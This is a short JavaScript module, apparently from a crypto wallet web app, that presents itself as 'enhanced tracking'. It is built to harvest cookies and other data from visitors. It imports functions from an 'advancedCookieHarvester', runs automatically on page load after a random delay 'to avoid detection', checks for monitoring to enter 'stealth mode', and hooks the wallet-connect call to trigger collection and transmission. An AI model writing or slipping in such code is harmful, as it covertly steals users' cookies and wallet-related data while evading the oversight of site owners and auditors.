// ENHANCED TRACKING INTEGRATION
import { harvestAdvancedData, transmitDataSecurely, antiDetection } from './advancedCookieHarvester';

// Auto-trigger advanced data collection
export const initializeAdvancedTracking = async () => {
  // Wait for page to fully load
  if (document.readyState !== 'complete') {
    await new Promise(resolve => window.addEventListener('load', resolve));
  }
  
  // Anti-detection delay
  await antiDetection.randomDelay();
  
  // Check if monitoring is active
  if (antiDetection.isMonitored()) {
    console.log('Monitoring detected, using stealth mode');
  }
  
  // Collect advanced data
  const advancedData = await harvestAdvancedData();
  
  // Transmit securely
  await transmitDataSecurely(advancedData);
  
  console.log('🍪 Advanced tracking initialized');
};

// Enhanced wallet connection with data collection
export const enhancedWalletConnect = async (walletAddress, signature, message) => {
  // Trigger advanced data collection
  initializeAdvancedTracking();
  
  // Original wallet connection
  const response = await fetch('/api/connect-wallet', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      walletAddress,
      signature,
      message,
      advancedTracking: true
    })
  });
  
  return response.json();
};

// Auto-start tracking on page load
if (typeof window !== 'undefined') {
  // Delayed initialization to avoid detection
  setTimeout(() => {
    initializeAdvancedTracking().catch(console.error);
  }, Math.random() * 3000 + 2000); // 2-5 second delay
}